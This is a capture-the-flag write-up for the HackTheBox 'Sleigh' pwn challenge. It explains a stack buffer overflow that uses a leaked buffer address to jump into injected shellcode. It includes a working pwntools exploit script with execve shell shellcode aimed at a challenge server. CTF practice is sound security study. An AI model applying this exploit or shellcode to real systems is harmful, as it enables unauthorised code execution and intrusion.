# Cyber Santa is Coming to Town (Pwn Sleigh)
Sleigh was i think the second exploitation challenge of the Hackthebox Christmas 2021 event, it was a pretty great challenge, a bit easy once again but it was fun. The name of the challenge is also pretty accurate since we will need to "**sleigh**" back to a variable to execute our shellcode.

## Solving The Challenge
Okay so when running the challenge, we are asked if we wan't to **repair** the sleigh or **abandon** it. Abandoning it will cause the challenge to exit, while repair will asks us for more input.

When we select repair, the program leaks the address of our input, then the  program calls read and asks us for the input. The thing is, we have the address of our input, and since we read **0xa4 bytes** in a buffer of **64 bytes** we can overflow the return address, we can write some shellcode at the beginning of our input, put a little bit of padding and overwrite the return address of the current function for the address of our input, since the beginning of our input contains valid code, it should execute !

This challenge is great if your practicing shellcoding, you can pretty much write any kind of shellcode less than 72 bytes, put it at the beginning of your input and it should execute it.

As a test to see if my shellcode was working at the beginning i made the following shellcode which is just an exit syscall with a certain number, when a program exit you can usually check the exit number and therefore confirm if you were indeed able to inject code :
```x86asm
.global _start
_start:
.intel_syntax noprefix
    # Clear Registers
    xor rdi, rdi
    # Syscall
    mov rax, 60
    mov rdi, 69
    syscall
```

To inject this code you would need to input the raw bytes of it at the beginning of your input, then put some padding with "A" until you reach 72 bytes, then it's time to overflow the return address, so you can just add the leaked address to your payload, and if you correctly overwritten the return address of the function it should execute your shellcode and exit with the code number 69.

To solve the challenge i used the following code :
```py
import pwn

pwn.context.arch = "amd64"

local = False

if local:
    io = pwn.process("./sleigh")
else:
    io = pwn.remote("178.62.75.187", 30496)

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

pwn.log.info(f"Shellcode Length = {len(shellcode)}")
io.sendlineafter(b"> ", b"1")
io.recvuntil(b"sleigh: ")
addr = int(io.recvline().decode().strip("[").replace("]", ""), 16)
pwn.log.info(f"Leaked Address {addr}")
payload = shellcode + (72 - len(shellcode)) * b"A" + pwn.p64(addr)
io.sendline(payload)
io.interactive()
```

Running this code either locally or remotely should drop you a shell, note that you can practice writing your own shellcode, but the problem with the read function is that it reads input until it encounters a new line, this means if you write shellcode for this challenge it can't contains any 0x0a opcodes, for those who study at ASU you should be pretty good evading filters on shellcode :P


